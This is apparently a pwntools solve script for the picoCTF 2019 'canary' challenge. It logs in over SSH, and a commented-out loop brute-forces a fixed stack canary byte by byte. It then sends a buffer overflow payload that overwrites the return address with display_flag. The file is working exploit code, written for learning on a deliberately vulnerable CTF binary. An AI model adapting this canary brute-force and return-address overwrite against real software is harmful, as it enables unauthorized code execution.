from pwn import *
import string
import json

'''
#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4
'''

LOCAL = False
elf = ELF('./vuln')

local_bin = "./vuln"

if(LOCAL):
    p = process(local_bin)
else:
    hostname = "2019shell1.picoctf.com"
    dir = '/problems/canary_5_f37171114d0d9fc71194842bb8b7bb34'
    with open("/.2019creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    p = s.process('sh')
    #p.sendline('./vuln')

display_flag = elf.symbols['display_flag']
#first  = l
#second = V
#third  = !
#fourth = )
'''
for letter in string.printable:
    if(LOCAL):
        p = process(local_bin)
    else:
        p.sendline('./vuln')
    payload = "A"*32
    payload += "lV!)"
    payload+=letter
    p2 = "36"
    p.recvline()
    p.sendline(p2)
    p.sendline(payload)
    x = p.recvline()
    if "Now" in x:
        print letter
        print x
        exit()
'''
print display_flag
payload = "A"*32
payload += "lV!)"
payload += "B"*16
payload += p32(display_flag)
flag_text = ""
while("pico" not in flag_text):
    if LOCAL:
        p = process('./vuln')
    else:
        p.sendline('./vuln')
    p.readuntil('> ')
    p.sendline(str(len(payload)))
    p.readuntil('Input> ')
    p.sendline(payload)
    p.recvline()
    try:
        flag_text=p.recvuntil("\n")
    except:
        p.close()
print flag_text
#print payload
#print len(payload)
#payload += p32(display_flag)
'''
#payload += p32(display_flag)
p2 = "56"
p.recvline()
p.sendline(p2)
p.sendline(payload)
print p.recvline()
print p.recvline()
print p.recvline()
#payload += p32(add_flag)
'''
